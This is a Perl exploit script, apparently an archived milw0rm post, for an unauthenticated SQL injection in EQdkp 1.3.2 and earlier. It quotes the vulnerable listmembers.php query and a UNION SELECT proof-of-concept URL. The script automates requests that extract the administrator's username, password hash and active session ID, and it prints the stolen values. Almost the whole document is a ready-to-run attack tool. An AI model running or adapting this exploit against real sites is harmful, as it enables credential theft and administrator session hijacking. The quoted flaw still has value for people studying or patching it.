#!/usr/bin/perl -w

#################################################################################
#										#
#		      EQdkp <= 1.3.2 SQL Injection Exploit			#
#										#
# Discovered by: Silentz							#
# Payload: Admin Username & Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (listmembers.php):						#
#										#
#  $sql = 'SELECT m.*, (m.member_earned-m.member_spent+m.member_adjustment) 	#
#  AS member_current, member_status, r.rank_name, r.rank_hide, r.rank_prefix, 	#
#  r.rank_suffix, c.class_name AS member_class, c.class_armor_type AS 		#
#  armor_type, c.class_min_level AS min_level, c.class_max_level AS max_level	#
#  FROM ' . MEMBERS_TABLE . ' m, ' . MEMBER_RANKS_TABLE . ' r, ' . CLASS_TABLE 	#
#  . ' c WHERE c.class_id = m.member_class_id AND (m.member_rank_id = 		#
#  r.rank_id)';									#
#    										#
# 	if ( !empty($_GET['rank']) )						#
#    {										#
#        $sql .= " AND r.rank_name='" . urldecode($_GET['rank']) . "'";		#
#    }										#
#										#
# PoC: http://victim.com/listmembers.php?show=all&rank=%2527 UNION SELECT 	#
#      0,username,0,0,0,0,0,0,0,0,0,0,0,0,0,user_password,0,NULL,NULL,0,0,0,0 	#
#      FROM eqdkp_users where user_id=1/*					#
# 										#
# Subject To: Nothing, no authentication...nada!				#
# GoogleDork: Get your own!							#
#										#
# Shoutz: The entire w4ck1ng community						#
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV < 1){
print "-------------------------------------------------------------------------\r\n";
print "                  EQdkp <= 1.3.2 SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_eqdkp.pl [PATH]\r\n\r\n";
print "[PATH] = Path where EQdkp is located\r\n\r\n";
print "e.g. w4ck1ng_eqdkp.pl http://victim.com/eqdkp/\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
exit();
}

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . "listmembers.php?show=all&rank=%2527 UNION SELECT 0,username,0,0,0,0,0,0,0,0,0,0,0,0,0,user_password,0,NULL,NULL,0,0,0,0 FROM eqdkp_users where user_id=1/*";
$res = $b->request(HTTP::Request->new(GET=>$host));

print "-------------------------------------------------------------------------\r\n";
print "                  EQdkp <= 1.3.2 SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";

if($res->content =~ /"><i>(.*?)<\/i><\/a><\/td>/){
print "[+] Admin User : $1\n";}

else {print "\n[-] Unable to retrieve admin username..."}

if($res->content =~ /">([0-9a-fA-F]{32})<\/a><\/td>/){
print "[+] Admin Hash : $1";}

else {print "\n[-] Unable to retrieve admin hash...\n";}

$host = $ARGV[0] . "listmembers.php?show=all&rank=%2527 UNION SELECT 0,session_id,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,NULL,NULL,0,0,0,0 FROM eqdkp_sessions where session_user_id=1/*";
$res = $b->request(HTTP::Request->new(GET=>$host));

if($res->content =~ /"><i>(.*?)<\/i><\/a><\/td>/){
print "[+] Admin SessionID : $1\n";}

else {print "\n[-] Unable to retrieve admin sessionid...he/she is not logged in!\n";}

print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";

# milw0rm.com [2007-06-04]